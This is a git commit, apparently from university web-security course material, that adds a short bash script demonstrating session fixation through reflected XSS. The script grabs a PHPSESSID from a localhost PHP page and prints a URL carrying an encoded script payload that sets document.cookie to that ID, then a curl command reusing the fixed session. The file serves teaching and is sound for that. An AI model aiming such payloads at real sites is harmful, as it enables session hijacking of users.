f6a038127230593d015132a72e0f774f80d46007
ybktr <taro.yabuki@it-chiba.ac.jp>
2024-09-29 11:31:41 +0900

    SOP回避例の追加

---
+++ 07-09/create-session.sh
@@ -0,0 +1,12 @@
+#!/bin/bash
+
+# curl でレスポンスヘッダーを取得
+response=$(curl -s -I http://localhost/session.php?username=XYZ)
+
+# レスポンスヘッダーから PHPSESSID の値を抽出
+session_id=$(echo "$response" | grep -oP '(?<=PHPSESSID=)[^;]+')
+
+# 抽出した PHPSESSID を用いて指定された2つの文字列を出力
+echo "http://localhost/hello.php?username=%3Cscript%3Edocument.cookie%3D'PHPSESSID%3D$session_id'%3B%3C%2Fscript%3E"
+echo "http://localhost/session.php?username=Yabuki"
+echo "curl http://localhost/session.php -H 'Cookie: PHPSESSID=$session_id'"
